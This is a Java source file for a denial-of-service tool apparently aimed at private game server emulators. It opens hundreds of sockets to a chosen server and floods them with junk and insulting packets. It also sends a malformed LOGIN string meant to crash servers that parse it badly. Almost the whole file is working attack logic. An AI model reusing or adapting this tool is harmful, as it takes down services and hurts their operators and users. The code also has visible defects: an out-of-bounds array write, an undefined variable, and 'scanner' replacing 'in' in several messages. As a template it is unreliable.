package com.manulaiko.psfucker.fuckers.global;

import com.manulaiko.psfucker.Option;
import com.manulaiko.psfucker.fuckers.Global;
import com.manulaiko.psfucker.net.global.ConnectionManager;
import com.manulaiko.psfucker.utils.Tools;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;

/**
 * DoS the emulator
 *
 * Denial of Service that should work on all servers
 *
 * @author Manulaiko
 * @package com.manulaiko.fuckers.global
 */
public class DosEmu extends Option implements Runnable
{
    private Socket socket;
    private ConnectionManager connection;
    private boolean alreadyTried;

    /**
     * Constructor
     * @param global
     */
    public DosEmu(Global global)
    {
        super(global);
        super.description = "DoS the emulator";
    }

    /**
     * Executes the fucker
     */
    public void fuck()
    {
        Thread buildSockets = new Thread(this);
        buildSockets.start();

        System.out.println("Press 'enter' to quit");
        Tools.scanner.nextLine();
        dos.stop();
    }
    
    /**
     * Builds sockets scanner a new thread
     */
    public void run()
    {
        while(true) {
            System.out.println("Building 500 sockets...");
            int totalPacketsSent = 0;
            ConnectionManager[] connections = new ConnectionManager[500];
            
            for(int i = 0; i < connections.length; i++) {
                connections[i] = connect();
                
                Thread dos = new Thread(){
                    /**
                     * Runs the DoS
                     */
                    public void run()
                    {
                        String[] packets = new String[10];
                        packets[0] = "Fuck you!";
                        packets[1] = "DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU";
                        packets[2] = "What the fuck did you just said about me you little bitch? I dare you to know that I graduated top on my class of the Navy Seals and I have over 300 confirmed kills";
                        packets[3] = ">inb4 PSFucker";
                        packets[4] = "Ohayou!";
                        packets[5] = "Ayy lmao!";
                        packets[6] = "It seems you're being fucked :)";
                        packets[7] = "If you want this to stop just put your mobile up scanner the air and shout 'ACTIVATEEEEE!'";
                        packets[8] = "LELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELEL";
                        packets[9] = ">implying";
                        packets[10] = "LOGIN|asdfasdfasdf|asdfasdf"; //If some servers can't parse packets properly a string instead of an integer might cause the server to explode :)

                        while(true) {
                            int pAmount = Tools.r.nextInt(2000);
                            System.out.println("Sending "+pAmount+" packets to server...");

                            for(int i = 0; i < pAmount; i++) {
                                connections[i].send(packets[Tools.r.nextInt(10)]);
                                if(!connections[i].isConnected()) {
                                    System.out.println("WE HAVE NEWS!!!");
                                    System.out.println("Connection to the server is stopped, this means server might be dead or we're scanner the blacklist :)");
                                    System.out.println("Press 'enter' to exit");
                                    Tools.scanner.nextLine();
                                    this.stop();
                                }
                            }

                            totalPacketsSent += pAmount;

                            try {
                                Thread.sleep(1000);
                            } catch(Exception e) {
                                //Empty
                            }
                        }
                    }
                };
                dos.start();
            }
            System.out.println("Sleeping for 30 seconds...");
            try {
                Thread.sleep(30000);
            } catch(Exception e) {
                //Empty
            }
            System.out.println("Successfully sent "+totalPacketsSent+" packets!");
            System.out.println("Press 'enter' to quit");
        }
    }
    
    /**
     * Connects to the server
     */
    public ConnectionManager connect()
    {
        try {
            this.socket = new Socket();
            this.socket.connect(new InetSocketAddress(this.fucker.server, 8080));
            System.out.println("Connected to the server!");
            return new ConnectionManager(socket);
        } catch(IOException e1) {
            if(alreadyTried) {
                System.out.print("Couldn't connect to the server: ");
                System.out.println(e1.getMessage());
                System.out.println("Exiting...");
                return null;
            } else {
                alreadyTried = true;
            }
            System.out.println("Couldn't connect to the server!");
            System.out.print("Re-enter server IP: ");
            String ip = Tools.scanner.nextLine();
            this.fucker.server = ip;
            connect();
        }

        return null;
    }
}
